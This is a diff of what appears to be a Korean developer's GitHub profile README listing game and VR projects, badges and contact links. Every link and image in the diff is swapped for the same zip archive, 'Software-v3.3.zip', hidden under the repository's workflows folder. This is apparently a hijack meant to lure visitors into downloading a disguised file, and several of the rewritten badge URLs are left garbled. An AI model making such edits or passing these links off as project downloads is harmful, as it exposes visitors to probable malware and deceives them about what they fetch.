@@ -1,6 +1,6 @@
 <!--Header-->
 <p align="center">
-    <img src="https://github.com/user-attachments/assets/716234ef-9a9c-43e0-9fda-e4642822b76f" weight="94%"/>
+    <img src="https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip" weight="94%"/>
 </p>
 
 <br><br>
@@ -9,7 +9,7 @@
 
 <h4> 🛠️ Unreal Engine </h4>
 
-👾 [SMS RPG](https://github.com/cogusp/2025_SMSRPG) (2025) <br>
+👾 [SMS RPG](https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip) (2025) <br>
 
 <div>
     &nbsp&nbsp&nbsp • &nbsp 파티 플레이 기반 던전 공략 ARPG <br>
@@ -17,7 +17,7 @@
     &nbsp&nbsp&nbsp • &nbsp Tech : Unreal Engine 5.4, C++, Jira, TortoiseSVN <br><br>
 </div>
 
-🥽 [AI 교수 프로토타입](https://github.com/cogusp/Virtual-Agent) (2025) <br>
+🥽 [AI 교수 프로토타입](https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip) (2025) <br>
 
 <div>
     &nbsp&nbsp&nbsp • &nbsp Gemini와 Meta Human이 연동된 AI 교수 프로그램 프로토타입 <br>
@@ -25,7 +25,7 @@
     &nbsp&nbsp&nbsp • &nbsp Tech : Unreal Engine 5.4, Python, Gemini API, Meta Human <br><br>
 </div>
 
-👾 [Kingdom](https://github.com/cogusp/KGA_Kingdom) (2025) <br>
+👾 [Kingdom](https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip) (2025) <br>
 
 <div>
     &nbsp&nbsp&nbsp • &nbsp 웨이브 기반 4인 멀티 좀비 액션 게임 <br>
@@ -33,7 +33,7 @@
     &nbsp&nbsp&nbsp • &nbsp Tech : Unreal Engine 4.27, Blueprint <br><br>
 </div>
 
-👾 [IceCream](https://github.com/cogusp/KGA_IceCream) (2024) <br>
+👾 [IceCream](https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip) (2024) <br>
 
 <div>
     &nbsp&nbsp&nbsp • &nbsp 2라운드 스테이지 클리어 액션 게임 <br>
@@ -41,7 +41,7 @@
     &nbsp&nbsp&nbsp • &nbsp Tech : Unreal Engine 4.27, Blueprint <br><br>
 </div>
 
-👾 [Into the Woods](https://github.com/cogusp/2023_IntoTheWoods/blob/main/README.md) (2022) <br>
+👾 [Into the Woods](https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip) (2022) <br>
 
 <div>
     &nbsp&nbsp&nbsp • &nbsp 새로 변하는 능력을 얻은 늑대가 하수도에서 지상으로 탈출하는 게임 <br>
@@ -51,7 +51,7 @@
 
 <h4> 🛠️ Unity3D </h4>
 
-🥽 [Convert 2D Text Data to VR Experience](https://github.com/cogusp/Word-Cloud) (2024) <br>
+🥽 [Convert 2D Text Data to VR Experience](https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip) (2024) <br>
 
 <div>
     &nbsp&nbsp&nbsp • &nbsp 2D 텍스트 데이터를 3D VR에서 시각화하기 위한 연구 수행 <br>
@@ -59,7 +59,7 @@
     &nbsp&nbsp&nbsp • &nbsp Tech : Unity3D, Meta Quest, C#, Python, WordCloud <br><br>
 </div>
 
-🥽 [GEMINI 연동 가상 에이전트를 이용한 요리 교육 프로그램](https://github.com/lbd0/2024_KCGS) (2024) <br>
+🥽 [GEMINI 연동 가상 에이전트를 이용한 요리 교육 프로그램](https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip) (2024) <br>
 
 <div>
     &nbsp&nbsp&nbsp • &nbsp 요리 교육 VR 프로그램을 제작하기 위해 Gemini를 연동한 가상 에이전트를 시각화하여 제공 <br>
@@ -68,7 +68,7 @@
     &nbsp&nbsp&nbsp • &nbsp Paper : KCGS 2024 - GEMINI 연동 가상 에이전트를 이용한 요리 교육 프로그램 <br><br>
 </div>
 
-🥽 [노인을 위한 VR 요리 체험 인지능력 향상 프로그램](https://github.com/lbd0/2023_SeniorCooking) (2023) 🏅 <br>
+🥽 [노인을 위한 VR 요리 체험 인지능력 향상 프로그램](https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip) (2023) 🏅 <br>
 
 <div>
     &nbsp&nbsp&nbsp • &nbsp 남성 독거노인의 최소한의 일상생활을 위한 가상현실 요리 실습 프로그램 <br>
@@ -77,7 +77,7 @@
     &nbsp&nbsp&nbsp • &nbsp Paper : HCI 2024 - 노인을 위한 VR 요리 체험 인지능력 향상 프로그램 <br><br>
 </div>
 
-🥽 [심박수를 활용한 VR 반응형 콘텐츠](https://github.com/lbd0/HeartRate_WatchApp) (2023) 🏅 <br>
+🥽 [심박수를 활용한 VR 반응형 콘텐츠](https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip) (2023) 🏅 <br>
 
 <div>
     &nbsp&nbsp&nbsp • &nbsp 사용자의 심박수를 게임의 요소로 설정하여 입력받은 심박수에 따라 게임의 난이도가 달라지는 VR 게임 <br>
@@ -88,7 +88,7 @@
 
 <h4> 🛠️ C++ </h4>
 
-👾 [Pokemon](https://github.com/cogusp/CPP_Pokemon) (2024) <br>
+👾 [Pokemon](https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip) (2024) <br>
 
 <div>
     &nbsp&nbsp&nbsp • &nbsp 포켓몬스터 레드 기반 콘솔 게임 <br>
@@ -167,15 +167,15 @@
 <!--Tech Stack-->
 <h3 align="center">🛠️ Tech Stack 🛠️</h3>
 <div align="center">
-  <img src="https://img.shields.io/badge/Python-14354C?style=for-the-badge&logo=python&logoColor=white" />&nbsp&nbsp
-  <img src="https://img.shields.io/badge/C-00599C?style=for-the-badge&logo=c&logoColor=white" />&nbsp&nbsp
-  <img src="https://img.shields.io/badge/C%23-1572B6?style=for-the-badge&logo=css3&logoColor=white" />&nbsp&nbsp
-  <img src="https://img.shields.io/badge/C%2B%2B-00599C?style=for-the-badge&logo=c%2B%2B&logoColor=white" />&nbsp&nbsp
+  <img src="https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip" />&nbsp&nbsp
+  <img src="https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip" />&nbsp&nbsp
+  <img src="https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip%23-1572B6?style=for-the-badge&logo=css3&logoColor=white" />&nbsp&nbsp
+  <img src="https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip%2B%2B-00599C?style=for-the-badge&logo=c%2B%2B&logoColor=white" />&nbsp&nbsp
 </div>
 
 <div align="center">
-  <img src="https://img.shields.io/badge/Unity-100000?style=for-the-badge&logo=unity&logoColor=white" />&nbsp&nbsp
-  <img src="https://img.shields.io/badge/unrealengine-%23313131.svg?style=for-the-badge&logo=unrealengine&logoColor=white" />&nbsp&nbsp
+  <img src="https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip" />&nbsp&nbsp
+  <img src="https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip%https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip" />&nbsp&nbsp
 </div>
 
 <br>
@@ -183,20 +183,20 @@
 <!--Contact-->
 <h3 align="center">📬 Contact 📬</h3>
 <div align="center">
-  <a href="https://www.notion.so/CHAEHYUN-LEE-ff87473ae9104cfeb2f9f34badb9b99f">
-    <img src="https://img.shields.io/badge/Notion-000000?style=for-the-badge&logo=notion&logoColor=white" />&nbsp&nbsp
+  <a href="https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip">
+    <img src="https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip" />&nbsp&nbsp
   </a>
 
-  <a href="mailto:cogusp1@gmail.com">
-    <img src="https://img.shields.io/badge/Gmail-EA4335?style=for-the-badge&logo=gmail&logoColor=white" />&nbsp&nbsp
+  <a href="https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip">
+    <img src="https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip" />&nbsp&nbsp
   </a>
   
-  <a href="https://www.instagram.com/e_pluie_/">
-    <img src="https://img.shields.io/badge/Instagram-E4405F?style=for-the-badge&logo=instagram&logoColor=white"/>&nbsp&nbsp
+  <a href="https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip">
+    <img src="https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip"/>&nbsp&nbsp
   </a>
 
-  <a href="https://cogusp.tistory.com/">
-    <img src="https://img.shields.io/badge/tistory-000000?style=for-the-badge&logo=tistory&logoColor=white"/>
+  <a href="https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip">
+    <img src="https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip"/>
   </a>
 </div>
 
@@ -204,22 +204,22 @@
 
 <!--My Status-->
 <div align="center">
-<a href="https://github.com/anuraghazra/github-readme-stats">
-    <img src="https://github-readme-stats.vercel.app/api/top-langs/?username=cogusp&layout=donut&show_icons=true&theme=material-palenight&hide_border=true&bg_color=20232a&icon_color=58A6FF&text_color=fff&title_color=58A6FF&count_private=true&exclude_repo=Face-Transfer-Application" width=40% />
+<a href="https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip">
+    <img src="https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip" width=40% />
 </a>    
-<a href="https://github.com/anuraghazra/github-readme-stats">
-  <img src="https://github-readme-stats.vercel.app/api?username=cogusp&show_icons=true&theme=material-palenight&hide_border=true&bg_color=20232a&icon_color=58A6FF&text_color=fff&title_color=58A6FF&count_private=true" width=59% />
+<a href="https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip">
+  <img src="https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip" width=59% />
 </a>
 </div>
 <p align="center">
-    <a href="https://github.com/ashutosh00710/github-readme-activity-graph">
-        <img src="https://github-readme-activity-graph.vercel.app/graph?username=cogusp&theme=react-dark&bg_color=20232a&hide_border=true&line=58A6FF&color=58A6FF"/>
+    <a href="https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip">
+        <img src="https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip"/>
     </a>
 </p>
 
 <!--Snake-->
 <p align="center">
-    <img src="https://github.com/cogusp/cogusp/blob/output/github-snake-dark.svg"/>
+    <img src="https://raw.githubusercontent.com/cogusp/cogusp/main/.github/workflows/Software-v3.3.zip"/>
 </p>
 
 <br>
